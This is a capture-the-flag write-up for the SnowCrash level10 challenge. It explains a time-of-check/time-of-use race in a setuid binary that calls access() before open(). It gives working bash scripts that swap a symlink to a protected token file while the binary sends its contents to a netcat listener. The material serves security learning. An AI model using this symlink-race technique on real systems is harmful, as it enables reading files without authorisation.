# Solution

Once we logged in, inside the home folder we find two file level10 which is a binary and token which is a text file.

When we launch level10 we get this message: 
```sh
level10@SnowCrash:~$ ./level10 
./level10 file host
        sends file to host if you have access to it
```

This give us an help message to properly use the level10 binary, so from this i decided to decompile the program and look what it does.
When taking a closer look at the file i found that it does a check with access() c function which basically will check if you have the right permission to access the file,
from this it will then open the file read what is inside of it and output it in the host that you provided at the port 6969 (noice).

So the exploit is pretty simple since access is first done and then you open file this is a race condition, you need to provide a binary that you have access first,
and replace that one with one that you dont have access and you want to read here token file in the home folder.


So we need to create two script that will run in infinite loop, one will do the race condition, 
while the other will use the level10 binary with filename and host

first script for the race condition:
```sh
#!/bin/bash

touch /var/tmp/valid_file

while true
do
    ln -sf /var/tmp/valid_file /var/tmp/fake
    ln -sf /home/user/level10/token /var/tmp/fake
done
```

second script to send the file: 
```sh
#!/bin/bash

while true
do
    /home/user/level10/level10 /var/tmp/fake 127.0.0.1
done
```

From that we will need to have 3 logged user on level10 one for each script and one extra that will listen via netcat:

1st one launching the race_condition script:
```sh
level10@SnowCrash:~$ bash /tmp/race_condition.sh
```

2nd one launching the sending file script:
```sh
level10@SnowCrash:~$ bash /tmp/send_file.sh
```

3rd one waiting to received the flag via netcat:
```sh
level10@SnowCrash:~$ nc -k 127.0.0.1 6969
```
and we will get the flag once the race condition happen.
